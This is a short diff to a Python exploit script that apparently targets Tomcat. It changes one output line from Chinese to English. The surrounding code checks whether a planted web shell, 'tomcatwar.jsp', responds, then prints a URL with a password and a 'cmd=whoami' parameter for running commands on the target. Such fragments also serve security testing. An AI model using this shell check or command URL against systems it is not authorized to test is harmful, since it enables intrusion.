@@ -19,7 +19,7 @@ def Exploit(url):
         shellurl = urljoin(url, 'tomcatwar.jsp')
         shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
         if shellgo.status_code == 200:
-            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
+            print(f"Vulnerable，shell ip:{shellurl}?pwd=j&cmd=whoami")
     except Exception as e:
         print(e)
         pass
